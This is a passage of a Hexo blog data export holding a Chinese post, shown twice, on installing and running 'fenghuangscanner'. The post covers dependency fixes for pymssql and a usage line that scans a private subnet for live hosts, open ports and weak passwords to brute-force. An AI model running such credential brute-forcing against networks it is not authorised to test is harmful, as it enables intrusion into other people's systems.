class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> fenghuangscanner</div><div class=\"line\">pip install -r requirements.txt         <span class=\"comment\"># 安装依赖包</span></div><div class=\"line\">python fenghuangscanner.py -h           <span class=\"comment\"># 运行</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 在安装依赖包的过程中可能会报错。  主要是pymssql这个包</span></div><div class=\"line\">brew install freetds</div><div class=\"line\">pip install cython</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 如果仍然不行，\b\b使用下面命令安装最新的pymssql</span></div><div class=\"line\">pip install git+https://github.com/pymssql/pymssql.git</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Because 2.2.0 still hasn't made it to PyPI as of this comment, the following command from @bkanuka still works and installed smoothly without a single error:</span></div><div class=\"line\"><span class=\"comment\"># pip install git+https://github.com/pymssql/pymssql.git</span></div></pre></td></tr></table></figure>\n<p>问题参考   <a href=\"https://github.com/Homebrew/homebrew-python/issues/338\" target=\"_blank\" rel=\"external\">https://github.com/Homebrew/homebrew-python/issues/338</a></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python fenghuangscan.py --ip 192.168.199.0/24</div></pre></td></tr></table></figure>\n<p>主机存活扫描 –&gt; 端口扫描 –&gt; 弱口令爆破</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"下载地址-https-github-com-wilson9x1-fenghuangscanner\"><a href=\"#下载地址-https-github-com-wilson9x1-fenghuangscanner\" class=\"headerlink\" title=\"下载地址 : https://github.com/wilson9x1/fenghuangscanner\"></a>下载地址 : <a href=\"https://github.com/wilson9x1/fenghuangscanner\">https://github.com/wilson9x1/fenghuangscanner</a></h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> fenghuangscanner</div><div class=\"line\">pip install -r requirements.txt         <span class=\"comment\"># 安装依赖包</span></div><div class=\"line\">python fenghuangscanner.py -h           <span class=\"comment\"># 运行</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 在安装依赖包的过程中可能会报错。  主要是pymssql这个包</span></div><div class=\"line\">brew install freetds</div><div class=\"line\">pip install cython</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 如果仍然不行，\b\b使用下面命令安装最新的pymssql</span></div><div class=\"line\">pip install git+https://github.com/pymssql/pymssql.git</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Because 2.2.0 still hasn't made it to PyPI as of this comment, the following command from @bkanuka still works and installed smoothly without a single error:</span></div><div class=\"line\"><span class=\"comment\"># pip install git+https://github.com/pymssql/pymssql.git</span></div></pre></td></tr></table></figure>\n<p>问题参考   <a href=\"https://github.com/Homebrew/homebrew-python/issues/338\">https://github.com/Homebrew/homebrew-python/issues/338</a></p>\n<h3 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python fenghuangscan.py --ip 192.168.199.0/24</div></pre></td></tr></table></figure>\n<p>主机存活扫描 –&gt; 端口扫描 –&gt; 弱口令爆破</p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cj3oaflt90003a8uv403yu5c1","tag_id":"cj3oafltf0005a8uvyy6bqp2j","_id":"cj3oaflts0009a8uv98wsxv3g"}],"Tag":[{"name":"Python","_id":"cj3oafltf0005a8uvyy6bqp2j"}]}}